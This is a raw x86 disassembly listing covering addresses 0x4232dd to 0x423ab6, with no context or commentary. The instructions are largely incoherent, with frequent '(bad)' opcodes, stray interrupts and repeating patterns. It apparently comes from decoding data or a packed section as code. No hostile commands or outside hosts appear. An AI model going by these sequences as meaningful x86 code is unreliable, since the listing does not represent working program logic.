  4232dd:	shr    DWORD PTR [edi],cl
  4232df:	add    eax,0x80805300
  4232e4:	int    0x76
  4232e6:	stc    
  4232e7:	int    0x8d
  4232e9:	stc    
  4232ea:	cmp    eax,ebp
  4232ec:	cmp    ecx,DWORD PTR [edi]
  4232ee:	shl    edx,cl
  4232f0:	sub    bl,dl
  4232f2:	mov    ebp,0xcdd35392
  4232f7:	(bad)  
  4232f8:	std    
  4232f9:	inc    ebx
  4232fa:	shr    DWORD PTR [edi],cl
  4232fc:	add    eax,0x808053ea
  423301:	int    0x76
  423303:	stc    
  423304:	int    0x8d
  423306:	stc    
  423307:	cmp    eax,ebp
  423309:	cmp    ecx,DWORD PTR [edi]
  42330b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423311:	push   ebx
  423312:	shr    esp,cl
  423314:	adc    al,0xcd
  423316:	lea    esi,[ebp+0x3bb596cd]
  42331c:	or     al,0x3b
  42331e:	cdq    
  42331f:	shr    ebx,cl
  423321:	xchg   edx,eax
  423322:	shr    edx,cl
  423324:	sub    BYTE PTR [ebx+0x13],dl
  423327:	xchg   ebx,edx
  423329:	int    0x8d
  42332b:	std    
  42332c:	inc    ebx
  42332d:	rol    DWORD PTR [edx-0x2893219],cl
  423333:	or     dh,BYTE PTR [esi-0x53]
  423336:	int    0x76
  423338:	jne    0x423344
  42333a:	jbe    0x42330c
  42333c:	ret    
  42333d:	dec    ecx
  42333e:	and    DWORD PTR [esi+0x45e60a35],eax
  423344:	leave  
  423345:	jbe    0x4232e4
  423347:	inc    ecx
  423348:	and    DWORD PTR [esi+0x4576cd35],eax
  42334e:	int    0x8d
  423350:	inc    ebp
  423351:	cmp    eax,ebp
  423353:	cmp    ecx,DWORD PTR [edi]
  423355:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42335b:	push   ebx
  42335c:	ror    DWORD PTR [edx],cl
  42335e:	jbe    0x4233b5
  423360:	int    0x76
  423362:	inc    ebp
  423363:	int    0x8d
  423365:	inc    ebp
  423366:	cmp    eax,ebp
  423368:	cmp    ecx,DWORD PTR [edi]
  42336a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423370:	push   ebx
  423371:	ror    DWORD PTR [edx],cl
  423373:	jbe    0x42330a
  423375:	leave  
  423376:	jbe    0x4233b5
  423378:	dec    eax
  423379:	and    DWORD PTR [esi+0x1d76c935],eax
  42337f:	ret    0x8621
  423382:	xor    eax,0xcd4576cd
  423387:	lea    eax,[ebp+0x3b]
  42338a:	lds    edi,FWORD PTR [ebx]
  42338c:	psrlq  mm6,mm2
  42338f:	sub    bl,dl
  423391:	mov    ebp,0xcdd35392
  423396:	lea    ebp,[ebp+0x52f7d43]
  42339c:	push   ss
  42339d:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233a3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233aa:	cmp    eax,0x3b5596cd
  4233af:	jns    0x4233ec
  4233b1:	or     al,0xd3
  4233b3:	lods   eax,DWORD PTR ds:[esi]
  4233b4:	sub    bl,dl
  4233b6:	jmp    0x42334a
  4233b8:	push   ebx
  4233b9:	jge    0x423388
  4233bb:	jbe    0x42336a
  4233bd:	xor    edx,edx
  4233bf:	cmp    ebx,edx
  4233c1:	clc    
  4233c2:	add    cl,BYTE PTR [edx]
  4233c4:	jbe    0x42335b
  4233c6:	int    0x76
  4233c8:	sbb    eax,0x3b1d8dcd
  4233cd:	lds    edi,FWORD PTR [ebx]
  4233cf:	psrlq  mm6,mm2
  4233d2:	sub    bl,dl
  4233d4:	mov    ebp,0xcdd35392
  4233d9:	lea    edx,[ebp+0x16d87d43]
  4233df:	int    0x76
  4233e1:	sbb    eax,0x3b1d8dcd
  4233e6:	lds    edi,FWORD PTR [ebx]
  4233e8:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  4233ef:	push   ebx
  4233f0:	ror    DWORD PTR [edx],cl
  4233f2:	jbe    0x423389
  4233f4:	int    0x76
  4233f6:	cmp    eax,0x3b3d8dcd
  4233fb:	lds    edi,FWORD PTR [ebx]
  4233fd:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423404:	push   ebx
  423405:	ror    ebp,cl
  423407:	lea    edx,[ebp+0xad3d12f]
  42340d:	jbe    0x4233a4
  42340f:	int    0x76
  423411:	inc    ebp
  423412:	int    0x8d
  423414:	inc    ebp
  423415:	cmp    eax,ebp
  423417:	cmp    ecx,DWORD PTR [edi]
  423419:	shl    edx,cl
  42341b:	sub    bl,dl
  42341d:	mov    ebp,0xcdd35392
  423422:	lea    edx,[ebp+0x52f7d43]
  423428:	pusha  
  423429:	xchg   edx,eax
  42342a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423431:	or     eax,0x875576cd
  423436:	jbe    0x423408
  423438:	or     ah,dh
  42343a:	xchg   ebp,eax
  42343b:	or     dh,BYTE PTR [esi+0x6d]
  42343e:	pop    ebp
  42343f:	inc    ecx
  423440:	and    DWORD PTR [esi+0x5d760a35],eax
  423446:	leave  
  423447:	jbe    0x42345e
  423449:	cmp    DWORD PTR [ecx],esp
  42344b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423451:	and    DWORD PTR [esi-0xe89f5cb],eax
  423457:	int    0x76
  423459:	xchg   ebp,eax
  42345a:	int    0x8d
  42345c:	xchg   ebp,eax
  42345d:	cmp    eax,ebp
  42345f:	cmp    ecx,DWORD PTR [edi]
  423461:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423467:	push   ebx
  423468:	ror    DWORD PTR [edx],cl
  42346a:	jbe    0x4234e9
  42346c:	int    0x6d
  42346e:	jmp    0x423476
  423470:	add    DWORD PTR [eax-0x36923280],0x7006
  42347a:	add    BYTE PTR [ebx],cl
  42347c:	and    DWORD PTR [esi-0x369232cb],eax
  423482:	push   es
  423483:	xchg   esp,eax
  423484:	add    BYTE PTR [eax],al
  423486:	add    bh,dh
  423488:	and    DWORD PTR [esi-0x329232cb],eax
  42348e:	ins    DWORD PTR es:[edi],dx
  42348f:	int    0x76
  423491:	icebp  
  423492:	int    0x8d
  423494:	icebp  
  423495:	cmp    eax,ebp
  423497:	cmp    ecx,DWORD PTR [edi]
  423499:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42349f:	push   ebx
  4234a0:	ror    ebp,cl
  4234a2:	lea    edi,[ebp+0x2f]
  4234a5:	rcl    ebx,1
  4234a7:	int    0x8d
  4234a9:	ins    DWORD PTR es:[edi],dx
  4234aa:	retf   0x8884
  4234ad:	or     DWORD PTR [esi-0x57],esi
  4234b0:	int    0x6d
  4234b2:	int    0x76
  4234b4:	icebp  
  4234b5:	int    0x8d
  4234b7:	icebp  
  4234b8:	cmp    ecx,DWORD PTR [edi]
  4234ba:	cmp    eax,ebp
  4234bc:	shl    edx,cl
  4234be:	sub    bl,dl
  4234c0:	mov    ebp,0xcdd35392
  4234c5:	lea    edi,[ebp+0x2f]
  4234c8:	rcl    ebx,1
  4234ca:	int    0x8d
  4234cc:	adc    eax,0x3b1596cd
  4234d1:	or     al,0x3b
  4234d3:	cdq    
  4234d4:	shr    ebx,cl
  4234d6:	xchg   edx,eax
  4234d7:	shr    edx,cl
  4234d9:	sub    BYTE PTR [ebx+0x13],dl
  4234dc:	xchg   ebx,edx
  4234de:	int    0x8d
  4234e0:	ins    DWORD PTR es:[edi],dx
  4234e1:	das    
  4234e2:	pop    ecx
  4234e3:	dec    esp
  4234e4:	mov    ch,cl
  4234e6:	push   es
  4234e7:	jo     0x4234e9
  4234e9:	add    BYTE PTR [eax],al
  4234eb:	int    0x17
  4234ed:	jo     0x4234ef
  4234ef:	add    BYTE PTR [eax],al
  4234f1:	cmp    eax,ebp
  4234f3:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  4234f9:	jmp    0x2fd3:0x87d25328
  423500:	pop    ecx
  423501:	lea    ebp,[ecx-0x72f682c5]
  423507:	test   eax,0x76ca6dcd
  42350c:	test   eax,0xcdf18dcd
  423511:	xchg   esi,eax
  423512:	icebp  
  423513:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423516:	cdq    
  423517:	shr    edx,cl
  423519:	sub    bl,dl
  42351b:	jmp    0x4234af
  42351d:	push   ebx
  42351e:	adc    ecx,ebp
  423520:	xchg   esi,eax
  423521:	jge    0x423552
  423523:	rcl    DWORD PTR [ebx],1
  423525:	int    0x96
  423527:	ins    DWORD PTR es:[edi],dx
  423528:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42352f:	icebp  
  423530:	int    0x8d
  423532:	icebp  
  423533:	cmp    eax,ebp
  423535:	cmp    ecx,DWORD PTR [edi]
  423537:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42353d:	push   ebx
  42353e:	ror    ebp,cl
  423540:	lea    edi,[ebp+0x2f]
  423543:	rcl    ebx,1
  423545:	int    0x8d
  423547:	ins    DWORD PTR es:[edi],dx
  423548:	retf   0x8884
  42354b:	or     DWORD PTR [esi-0x57],esi
  42354e:	int    0x6d
  423550:	int    0x76
  423552:	icebp  
  423553:	int    0x8d
  423555:	icebp  
  423556:	cmp    eax,ebp
  423558:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42355e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423562:	int    0x8d
  423564:	jge    0x423595
  423566:	rcl    ebx,1
  423568:	int    0x8d
  42356a:	pop    ebp
  42356b:	int    0x96
  42356d:	pop    ebp
  42356e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423571:	cdq    
  423572:	shr    ebx,cl
  423574:	xchg   edx,eax
  423575:	shr    edx,cl
  423577:	sub    BYTE PTR [ebx+0x13],dl
  42357a:	xchg   ebx,edx
  42357c:	int    0x8d
  42357e:	ins    DWORD PTR es:[edi],dx
  42357f:	das    
  423580:	pop    ecx
  423581:	dec    esp
  423582:	mov    ch,cl
  423584:	push   es
  423585:	xchg   esp,eax
  423586:	add    BYTE PTR [eax],al
  423588:	add    ch,cl
  42358a:	pop    ss
  42358b:	xchg   esp,eax
  42358c:	add    BYTE PTR [eax],al
  42358e:	add    BYTE PTR [ebx],bh
  423590:	lds    edi,FWORD PTR [ebx]
  423592:	cdq    
  423593:	sar    DWORD PTR [ebp+0x28ead392],cl
  423599:	push   ebx
  42359a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235a0:	test   eax,0x8d097d3b
  4235a5:	test   eax,0x76ca6dcd
  4235aa:	test   eax,0xcdf18dcd
  4235af:	xchg   esi,eax
  4235b0:	icebp  
  4235b1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b4:	cdq    
  4235b5:	shr    edx,cl
  4235b7:	sub    bl,dl
  4235b9:	jmp    0x42354d
  4235bb:	push   ebx
  4235bc:	adc    ecx,ebp
  4235be:	xchg   esi,eax
  4235bf:	jge    0x4235f0
  4235c1:	rcl    DWORD PTR [ebx],1
  4235c3:	int    0x96
  4235c5:	ins    DWORD PTR es:[edi],dx
  4235c6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235cd:	xor    eax,0x3b358dcd
  4235d2:	(bad)  
  4235d4:	(bad)
  4235d7:	sub    bl,dl
  4235d9:	mov    ebp,0xcdd35392
  4235de:	lea    ebx,[ebp-0x33]
  4235e1:	xchg   esi,eax
  4235e2:	pop    ebp
  4235e3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235e6:	cdq    
  4235e7:	shr    ebx,cl
  4235e9:	xchg   edx,eax
  4235ea:	shr    edx,cl
  4235ec:	sub    BYTE PTR [ebx+0x13],dl
  4235ef:	das    
  4235f0:	rcl    ebx,1
  4235f2:	xchg   DWORD PTR [esi+0x7d],esi
  4235f5:	or     dh,BYTE PTR [esi+0x7d]
  4235f8:	int    0x76
  4235fa:	jge    0x4235c9
  4235fc:	lea    ecx,ds:0xb2f7d43
  423602:	(bad)  
  423603:	inc    DWORD PTR [eax]
  423605:	add    ch,cl
  423607:	jbe    0x423666
  423609:	int    0x8d
  42360b:	pop    ebp
  42360c:	cmp    ecx,DWORD PTR [edi]
  42360e:	shl    edx,cl
  423610:	sub    BYTE PTR [ebx],bh
  423612:	(bad)
  423615:	xchg   edx,eax
  423616:	push   ebx
  423617:	ror    ebp,cl
  423619:	lea    ecx,ds:0xcdd3d12f
  42361f:	lea    edx,[ebp-0x142cf3c5]
  423625:	xchg   edx,eax
  423626:	push   ebx
  423627:	ror    ebp,cl
  423629:	lea    edx,[ebp-0xd2cf0c5]
  42362f:	sub    BYTE PTR [ebx-0x2d],dl
  423632:	or     dh,BYTE PTR [esi+0x35]
  423635:	int    0x76
  423637:	popf   
  423638:	int    0x8d
  42363a:	popf   
  42363b:	cmp    ecx,DWORD PTR [edi]
  42363d:	shl    edx,cl
  42363f:	sub    BYTE PTR [ebx],bh
  423641:	(bad)
  423644:	xchg   edx,eax
  423645:	push   ebx
  423646:	ror    ebp,cl
  423648:	lea    ebx,[ebp+0x3b9d96cd]
  42364e:	or     al,0xd3
  423650:	jmp    0x4235e4
  423652:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423658:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42365e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423664:	in     al,dx
  423665:	sbb    al,0xcd
  423667:	jbe    0x423606
  423669:	int    0x8d
  42366b:	popf   
  42366c:	cmp    eax,ebp
  42366e:	cmp    ecx,DWORD PTR [edi]
  423670:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423676:	push   ebx
  423677:	rol    DWORD PTR [edi+0x760a5576],cl
  42367d:	push   ebp
  42367e:	int    0x76
  423680:	popf   
  423681:	int    0x8d
  423683:	popf   
  423684:	cmp    eax,ebp
  423686:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42368c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423690:	int    0x8d
  423692:	lods   eax,DWORD PTR ds:[esi]
  423693:	xor    edi,DWORD PTR [ebp-0x33]
  423696:	jbe    0x423635
  423698:	int    0x96
  42369a:	popf   
  42369b:	cmp    eax,ebp
  42369d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236a3:	mov    ebp,0xcdd25392
  4236a8:	xchg   esi,eax
  4236a9:	push   ebp
  4236aa:	das    
  4236ab:	rcl    edx,1
  4236ad:	inc    ebx
  4236ae:	shr    DWORD PTR [edi],cl
  4236b0:	pop    es
  4236b1:	adc    ebp,edi
  4236b3:	add    BYTE PTR [eax],al
  4236b5:	int    0x76
  4236b7:	stc    
  4236b8:	int    0x76
  4236ba:	stc    
  4236bb:	int    0x76
  4236bd:	std    
  4236be:	or     dh,BYTE PTR [esi+0x35]
  4236c1:	int    0x76
  4236c3:	mov    ch,cl
  4236c5:	lea    esp,ds:0x3b2596cd
  4236cb:	or     al,0xd3
  4236cd:	jmp    0x423661
  4236cf:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4236d5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4236dc:	jno    0x4236ab
  4236de:	lea    esp,[ebp-0x33]
  4236e1:	xchg   esi,eax
  4236e2:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4236e6:	cdq    
  4236e7:	shr    ebx,cl
  4236e9:	xchg   edx,eax
  4236ea:	shr    edx,cl
  4236ec:	sub    BYTE PTR [ebx+0x13],dl
  4236ef:	jno    0x4236be
  4236f1:	(bad)  
  4236f2:	stc    
  4236f3:	int    0x96
  4236f5:	stc    
  4236f6:	add    dh,dl
  4236f8:	xor    eax,0x993b0c3b
  4236fd:	shr    ebx,cl
  4236ff:	xchg   edx,eax
  423700:	shr    edx,cl
  423702:	sub    BYTE PTR [ebx+0x13],dl
  423705:	jno    0x423707
  423707:	jo     0x42371d
  423709:	int    0x8d
  42370b:	stc    
  42370c:	int    0x96
  42370e:	stc    
  42370f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423712:	cdq    
  423713:	shr    ebx,cl
  423715:	xchg   edx,eax
  423716:	shr    edx,cl
  423718:	sub    BYTE PTR [ebx+0x13],dl
  42371b:	or     dh,BYTE PTR [esi+0x65]
  42371e:	inc    ebx
  42371f:	jge    0x423750
  423721:	add    eax,0x808080ab
  423726:	int    0x76
  423728:	stc    
  423729:	in     al,dx
  42372a:	(bad)  
  42372b:	int    0x96
  42372d:	or     dh,BYTE PTR gs:[esi-0x53]
  423731:	push   ecx
  423732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423733:	lods   eax,DWORD PTR ds:[esi]
  423734:	int    0x8d
  423736:	lods   eax,DWORD PTR ds:[esi]
  423737:	shr    ebx,cl
  423739:	xchg   edx,eax
  42373a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42373d:	lods   eax,DWORD PTR ds:[esi]
  42373e:	sub    BYTE PTR [ebx-0x2d],dl
  423741:	int    0x8d
  423743:	jne    0x42370f
  423745:	dec    esp
  423746:	or     DWORD PTR [ecx],0x8dcd304c
  42374c:	mov    ch,0xcd
  42374e:	lea    esi,[ebp+0x3bb596cd]
  423754:	or     al,0x3b
  423756:	cdq    
  423757:	shr    edx,cl
  423759:	sub    bl,dl
  42375b:	jmp    0x4236ef
  42375d:	push   ebx
  42375e:	adc    ecx,ebp
  423760:	xchg   esi,eax
  423761:	mov    ch,0x87
  423763:	jge    0x423732
  423765:	jbe    0x423714
  423767:	cmp    edx,ebp
  423769:	add    al,0xad
  42376b:	std    
  42376c:	add    al,0xea
  42376e:	std    
  42376f:	shr    ebx,cl
  423771:	sub    BYTE PTR [edi+0x3bd353d2],al
  423777:	leave  
  423778:	int    0x8d
  42377a:	std    
  42377b:	int    0x96
  42377d:	std    
  42377e:	shr    edx,cl
  423780:	xchg   edx,eax
  423781:	shr    ebx,cl
  423783:	sub    BYTE PTR [ebx-0x1d],dl
  423786:	cmp    ebx,ecx
  423788:	inc    ebx
  423789:	rcl    dh,cl
  42378b:	mov    ds:0xcd8876cd,eax
  423790:	lea    ebp,ds:0xcd2d96cd
  423796:	add    DWORD PTR [ecx],edx
  423798:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237a2:	shr    edx,cl
  4237a4:	sub    BYTE PTR [ebx+0x13],dl
  4237a7:	jno    0x423776
  4237a9:	(bad)  
  4237aa:	stc    
  4237ab:	int    0x96
  4237ad:	stc    
  4237ae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237b1:	cdq    
  4237b2:	shr    ebx,cl
  4237b4:	xchg   edx,eax
  4237b5:	shr    edx,cl
  4237b7:	sub    BYTE PTR [ebx+0x13],dl
  4237ba:	jno    0x4237bc
  4237bc:	(bad)  
  4237bd:	jne    0x4237bf
  4237bf:	jo     0x4237dd
  4237c1:	int    0x76
  4237c3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237c7:	int    0x76
  4237c9:	xor    eax,0xcdfd760a
  4237ce:	jbe    0x4237cd
  4237d0:	cmp    ecx,ebx
  4237d2:	add    al,0xbd
  4237d4:	test   ah,dl
  4237d6:	xor    ecx,ebp
  4237d8:	jbe    0x42384f
  4237da:	int    0x14
  4237dc:	mov    ch,cl
  4237de:	jbe    0x423855
  4237e0:	int    0x84
  4237e2:	mov    BYTE PTR [ebx],bh
  4237e4:	jns    0x423821
  4237e6:	aad    0xd3
  4237e8:	lods   eax,DWORD PTR ds:[esi]
  4237e9:	sub    bl,dl
  4237eb:	repz xchg edx,eax
  4237ed:	push   ebx
  4237ee:	ror    ch,cl
  4237f0:	xchg   esi,eax
  4237f1:	jne    0x4237fd
  4237f3:	test   BYTE PTR [edx-0x33],cl
  4237f6:	jbe    0x4237f5
  4237f8:	add    al,0xd3
  4237fa:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423801:	xlat   BYTE PTR ds:[ebx]
  423802:	int    0x76
  423804:	std    
  423805:	cmp    ecx,ebx
  423807:	add    al,0xbd
  423809:	test   ah,dl
  42380b:	xor    ecx,ebp
  42380d:	jbe    0x423884
  42380f:	int    0x14
  423811:	mov    ch,cl
  423813:	jbe    0x42388a
  423815:	int    0x84
  423817:	mov    BYTE PTR [ebx],bh
  423819:	jns    0x423856
  42381b:	aad    0xd3
  42381d:	lods   eax,DWORD PTR ds:[esi]
  42381e:	sub    bl,dl
  423820:	repz xchg edx,eax
  423822:	push   ebx
  423823:	ror    ch,cl
  423825:	xchg   esi,eax
  423826:	jne    0x423832
  423828:	test   BYTE PTR [edx-0x33],cl
  42382b:	jbe    0x42382a
  42382d:	add    al,0xd3
  42382f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423836:	xlat   BYTE PTR ds:[ebx]
  423837:	int    0x76
  423839:	jne    0x423845
  42383b:	jbe    0x42384a
  42383d:	int    0x76
  42383f:	mov    ch,0xcd
  423841:	lea    esi,[ebp+0xf3bc53b]
  423847:	shl    edx,cl
  423849:	sub    bl,dl
  42384b:	mov    ebp,0xcdd35392
  423850:	(bad)  
  423851:	stc    
  423852:	or     dh,BYTE PTR [esi+0x25]
  423855:	leave  
  423856:	jbe    0x423824
  423858:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42385f:	imul   edx,ebp,0x8d0a0c69
  423865:	gs adc bh,dl
  423868:	into   
  423869:	and    DWORD PTR [esi-0x32fad0cb],eax
  42386f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423876:	sar    DWORD PTR [ebx],cl
  423878:	lds    ecx,FWORD PTR [edx]
  42387a:	jbe    0x423829
  42387c:	rol    esi,cl
  42387e:	lods   eax,DWORD PTR ds:[esi]
  42387f:	xchg   edx,eax
  423880:	or     dh,BYTE PTR [esi-0x30]
  423883:	int    0xd3
  423885:	cmp    edi,DWORD PTR [ecx-0x2d]
  423888:	lods   eax,DWORD PTR ds:[esi]
  423889:	sub    BYTE PTR [ebx+0x76],dl
  42388c:	lods   eax,DWORD PTR ds:[esi]
  42388d:	retf   0x858c
  423890:	int3   
  423891:	das    
  423892:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42389d:	retf   
  42389e:	inc    ebx
  42389f:	rcl    esi,cl
  4238a1:	jle    0x423870
  4238a3:	jbe    0x42385a
  4238a5:	int    0x8d
  4238a7:	mov    ch,0xcd
  4238a9:	jbe    0x423860
  4238ab:	int    0x96
  4238ad:	mov    ch,0x3b
  4238af:	jns    0x4238ec
  4238b1:	or     al,0xd3
  4238b3:	lods   eax,DWORD PTR ds:[esi]
  4238b4:	sub    bl,dl
  4238b6:	jmp    0x42384a
  4238b8:	push   ebx
  4238b9:	jge    0x423888
  4238bb:	jbe    0x423922
  4238bd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238c0:	lods   eax,DWORD PTR ds:[esi]
  4238c1:	sub    BYTE PTR [ebx+0x76],dl
  4238c4:	lods   eax,DWORD PTR ds:[esi]
  4238c5:	cmp    edx,ebp
  4238c7:	xchg   DWORD PTR [ebp-0x33],edi
  4238ca:	jbe    0x42389c
  4238cc:	add    al,0xea
  4238ce:	std    
  4238cf:	add    al,0xad
  4238d1:	std    
  4238d2:	shr    ebx,cl
  4238d4:	sub    BYTE PTR [edi+0x3b1353f1],al
  4238da:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  4238e1:	and    DWORD PTR [esi-0x323329cb],eax
  4238e7:	jbe    0x42390e
  4238e9:	in     al,dx
  4238ea:	and    cl,ch
  4238ec:	jbe    0x4238e7
  4238ee:	int    0x8d
  4238f0:	stc    
  4238f1:	cmp    eax,ebp
  4238f3:	cmp    ecx,DWORD PTR [edi]
  4238f5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4238fb:	push   ebx
  4238fc:	ror    ebp,cl
  4238fe:	(bad)  
  4238ff:	stc    
  423900:	int    0x96
  423902:	stc    
  423903:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423906:	cdq    
  423907:	shr    ebx,cl
  423909:	xchg   edx,eax
  42390a:	shr    edx,cl
  42390c:	sub    BYTE PTR [ebx+0x13],dl
  42390f:	inc    ebx
  423910:	jge    0x423941
  423912:	add    eax,0x80809223
  423917:	int    0x76
  423919:	or     eax,0xa886ccd
  42391e:	out    0xb5,al
  423920:	leave  
  423921:	jbe    0x423948
  423923:	mov    dl,0x21
  423925:	xchg   BYTE PTR ds:0x393576c9,dh
  42392b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423931:	dec    ecx
  423932:	mov    al,ds:0x76c93586
  423937:	lods   eax,DWORD PTR ds:[esi]
  423938:	imul   esp,DWORD PTR [ecx],0x76c93586
  42393e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423942:	xor    eax,0xcd3d760a
  423947:	jbe    0x4238d1
  423949:	int    0x8d
  42394b:	lods   eax,DWORD PTR ds:[esi]
  42394c:	int    0x96
  42394e:	lods   eax,DWORD PTR ds:[esi]
  42394f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423952:	jmp    0x4238e6
  423954:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42395a:	adc    esi,DWORD PTR [ecx-0x33]
  42395d:	lea    edx,[ebp+0x3b9596cd]
  423963:	or     al,0xd3
  423965:	jmp    0x4238f9
  423967:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42396d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423974:	jno    0x423943
  423976:	lea    esp,[ebp-0x33]
  423979:	xchg   esi,eax
  42397a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  42397e:	cdq    
  42397f:	shr    ebx,cl
  423981:	xchg   edx,eax
  423982:	shr    edx,cl
  423984:	sub    BYTE PTR [ebx+0x13],dl
  423987:	jno    0x423956
  423989:	lea    esi,[ebp+0x3bb596cd]
  42398f:	or     al,0x3b
  423991:	cdq    
  423992:	shr    ebx,cl
  423994:	xchg   edx,eax
  423995:	shr    edx,cl
  423997:	sub    BYTE PTR [ebx+0x13],dl
  42399a:	jno    0x42399c
  42399c:	jo     0x4239b2
  42399e:	or     dh,BYTE PTR [esi+0x65]
  4239a1:	int    0x76
  4239a3:	mov    ch,cl
  4239a5:	lea    ebp,[ebp+0x3bad96cd]
  4239ab:	or     al,0xd3
  4239ad:	jmp    0x423941
  4239af:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239b5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239bc:	jno    0x42398b
  4239be:	lea    edx,[ebp+0x3b9596cd]
  4239c4:	or     al,0x3b
  4239c6:	cdq    
  4239c7:	shr    ebx,cl
  4239c9:	xchg   edx,eax
  4239ca:	shr    edx,cl
  4239cc:	sub    BYTE PTR [ebx+0x13],dl
  4239cf:	jno    0x42399e
  4239d1:	lea    esi,[ebp+0xb596cd]
  4239d7:	(bad)  
  4239d8:	cmp    eax,0x993b0c3b
  4239dd:	shr    ebx,cl
  4239df:	xchg   edx,eax
  4239e0:	shr    edx,cl
  4239e2:	sub    BYTE PTR [ebx+0x13],dl
  4239e5:	jno    0x4239e7
  4239e7:	jo     0x4239fd
  4239e9:	int    0x8d
  4239eb:	mov    ch,0xa
  4239ed:	jbe    0x42399c
  4239ef:	int    0x76
  4239f1:	mov    ch,0x3b
  4239f3:	or     al,0x3b
  4239f5:	jns    0x4239ca
  4239f7:	jmp    0x42398b
  4239f9:	shr    DWORD PTR [ebp-0x3282acd8],cl
  4239ff:	jbe    0x423a66
  423a01:	inc    ebx
  423a02:	jge    0x423a33
  423a04:	add    eax,0x8080853c
  423a09:	int    0x8d
  423a0b:	mov    ch,0xcd
  423a0d:	xchg   esi,eax
  423a0e:	mov    ch,0x3b
  423a10:	or     al,0x3b
  423a12:	cdq    
  423a13:	shr    ebx,cl
  423a15:	xchg   edx,eax
  423a16:	shr    edx,cl
  423a18:	sub    BYTE PTR [ebx+0x13],dl
  423a1b:	inc    ebx
  423a1c:	lea    ebp,[ebp-0x7ab2fad1]
  423a22:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a29:	and    eax,0x192ebd3
  423a2e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a34:	mov    ch,0xcd
  423a36:	lea    esi,[ebp+0x192ebd3]
  423a3c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a42:	lea    esi,ds:0xd3358dcd
  423a48:	jmp    0x4239dc
  423a4a:	add    DWORD PTR [edx],eax
  423a4c:	scas   eax,DWORD PTR es:[edi]
  423a4d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a51:	aaa    
  423a52:	sbb    al,0x0
  423a54:	add    BYTE PTR [eax],al
  423a56:	add    BYTE PTR [edi+esi*1],0x24
  423a5a:	add    BYTE PTR [eax],al
  423a5c:	add    BYTE PTR [eax+0x24cfcf],al
  423a62:	add    BYTE PTR [eax],al
  423a64:	jno    0x423a66
  423a66:	(bad)  
  423a67:	cmp    eax,0x1ccfcf
  423a6c:	add    BYTE PTR [eax],al
  423a6e:	add    dh,dl
  423a70:	lods   eax,DWORD PTR ds:[esi]
  423a71:	jno    0x423a40
  423a73:	lea    ecx,ds:0xcd4c9100
  423a79:	lea    esi,[ebp+0x4]
  423a7c:	shl    DWORD PTR [eax],cl
  423a7e:	jno    0x423af0
  423a80:	mov    ebp,0xefef
  423a85:	or     dh,BYTE PTR [esi-0x30]
  423a88:	int    0x76
  423a8a:	mov    ch,cl
  423a8c:	lea    ebp,ds:0xcd2d96cd
  423a92:	add    DWORD PTR [ecx],edx
  423a94:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423a9e:	shr    edx,cl
  423aa0:	sub    BYTE PTR [ebx+0x13],dl
  423aa3:	jno    0x423a72
  423aa5:	lea    esi,[ebp+0x3bb596cd]
  423aab:	or     al,0x3b
  423aad:	cdq    
  423aae:	shr    ebx,cl
  423ab0:	xchg   edx,eax
  423ab1:	shr    edx,cl
  423ab3:	sub    BYTE PTR [ebx+0x13],dl
  423ab6:	jno    0x423ab8
